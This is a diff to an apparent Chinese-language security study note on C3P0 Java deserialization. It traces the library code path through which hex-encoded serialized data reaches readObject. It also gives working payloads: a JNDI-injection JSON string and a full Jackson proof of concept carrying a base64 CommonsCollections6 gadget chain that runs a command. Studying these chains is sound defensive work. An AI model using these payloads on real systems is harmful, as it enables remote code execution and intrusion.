@@ -1,3 +1,5 @@
+
+
 # [Java反序列化]C3P0反序列化
 
 ## 环境
@@ -373,3 +375,128 @@ public class C3P0 {
 ```
 
 又一个有意思的方法需要记住了，`getObjectInstance`。
+
+
+
+## JNDI注入
+
+Jackson的学习中了解到的：
+
+```java
+{"object":["com.mchange.v2.c3p0.JndiRefForwardingDataSource",{"jndiName":"rmi://localhost:8088/Exploit", "loginTimeout":0}]}
+```
+
+
+
+## hex序列化字节加载器
+
+关注`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`类的`userOverridesAsString`，反序列化调用其父类的`setter`：
+
+```java
+	public synchronized void setUserOverridesAsString( String userOverridesAsString ) throws PropertyVetoException
+	{
+		String oldVal = this.userOverridesAsString;
+		if ( ! eqOrBothNull( oldVal, userOverridesAsString ) )
+			vcs.fireVetoableChange( "userOverridesAsString", oldVal, userOverridesAsString );
+		this.userOverridesAsString = userOverridesAsString;
+	}
+```
+
+跟进：
+
+```java
+    private void setUpPropertyListeners()
+    {
+	VetoableChangeListener setConnectionTesterListener = new VetoableChangeListener()
+	    {
+		// always called within synchronized mutators of the parent class... needn't explicitly sync here
+		public void vetoableChange( PropertyChangeEvent evt ) throws PropertyVetoException
+		{
+		    String propName = evt.getPropertyName();
+		    Object val = evt.getNewValue();
+
+		    if ( "connectionTesterClassName".equals( propName ) )
+			{
+			    try
+				{ recreateConnectionTester( (String) val ); }
+			    catch ( Exception e )
+				{
+				    //e.printStackTrace();
+				    if ( logger.isLoggable( MLevel.WARNING ) )
+					logger.log( MLevel.WARNING, "Failed to create ConnectionTester of class " + val, e );
+				    
+				    throw new PropertyVetoException("Could not instantiate connection tester class with name '" + val + "'.", evt);
+				}
+			}
+		    else if ("userOverridesAsString".equals( propName ))
+			{
+			    try
+				{ WrapperConnectionPoolDataSource.this.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( (String) val ); }
+```
+
+调用`C3P0ImplUtils.parseUserOverridesAsString()`来解析：
+
+```java
+    public static Map parseUserOverridesAsString( String userOverridesAsString ) throws IOException, ClassNotFoundException
+    { 
+	if (userOverridesAsString != null)
+	    {
+		String hexAscii = userOverridesAsString.substring(HASM_HEADER.length() + 1, userOverridesAsString.length() - 1);
+		byte[] serBytes = ByteUtils.fromHexAscii( hexAscii );
+		return Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );
+	    }
+```
+
+```java
+    public static Object fromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
+    { 
+	Object out = deserializeFromByteArray( bytes ); 
+	if (out instanceof IndirectlySerialized)
+	    return ((IndirectlySerialized) out).getObject();
+	else
+	    return out;
+    }
+```
+
+反序列化：
+
+```java
+    public static Object deserializeFromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
+    {
+	ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
+	return in.readObject();
+    }
+```
+
+所以C3P0的这种不出网利用方式可以原生反序列化，但是需要Gadget。同时构造时用到的函数：
+
+```java
+    public static String bytesToHexString(byte[] bArray, int length) {
+        StringBuffer sb = new StringBuffer(length);
+        for(int i = 0; i < length; ++i) {
+            String sTemp = Integer.toHexString(255 & bArray[i]);
+            if (sTemp.length() < 2) {
+                sb.append(0);
+            }
+
+            sb.append(sTemp.toUpperCase());
+        }
+        return sb.toString();
+    }
+```
+
+
+
+尝试在jackson中打cc6：
+
+```java
+        byte[] evil = Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=");
+        String hexString = bytesToHexString(evil,evil.length);
+        String poc = "{\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",{\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hexString + ";\"}]}";
+        ObjectMapper mapper = new ObjectMapper();
+        mapper.enableDefaultTyping();
+        mapper.readValue(poc, Feng.class);
+```
+
+
+
